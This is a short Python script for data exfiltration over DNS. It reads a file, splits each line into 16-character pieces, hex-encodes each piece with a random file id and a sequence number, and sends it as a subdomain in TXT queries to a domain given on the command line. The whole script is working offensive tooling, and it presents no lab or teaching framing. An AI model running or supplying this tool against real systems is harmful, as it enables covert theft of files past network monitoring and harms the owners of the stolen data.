#!/usr/bin/env python3

import dns.resolver
import binascii
import argparse
import time
import random
import string

nonce='x6hq4'
parser = argparse.ArgumentParser()
parser.add_argument('--domain','-d',required=True)
parser.add_argument('--file','-f',required=True)
args = parser.parse_args()

def break_line(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def random_string_digits(string_length=4):
    """Generate a random string of letters and digits """
    letters_and_digits = string.ascii_letters + string.digits
    return ''.join(random.choice(letters_and_digits) for i in range(string_length))

def make_query(missing_piece):
	string = ("%s,%s,%s\n"%(file_id,f'{num:05}',missing_piece))
	encoded_string = binascii.hexlify(string.encode('utf-8'))
	tld = ("d.%s.%s.%s"%(encoded_string.decode('utf-8'),nonce,args.domain))
	dns.resolver.query(tld,'TXT')

num = 1
file_id =  random_string_digits()
with open (args.file,"r") as work_file:
	make_query(args.file)
	num += 1
	for line in work_file:
		for piece in break_line(line.rstrip(),16):
			make_query(piece)
			num += 1
			#time.sleep(1)
work_file.close()
exit()
